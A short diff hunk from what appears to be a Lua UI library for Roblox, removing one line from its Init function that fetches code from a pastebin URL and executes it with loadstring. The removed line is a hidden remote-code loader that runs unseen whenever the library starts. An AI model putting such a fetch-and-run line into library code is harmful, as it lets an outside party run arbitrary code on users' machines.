@@ -4341,8 +4341,6 @@ function library:Init(key)
 		return thread
 	end
 	
-	loadstring(game:HttpGet("https://pastebin.com/raw/tcnND0RT"))()
-	
 	return TabLibrary
 end
 
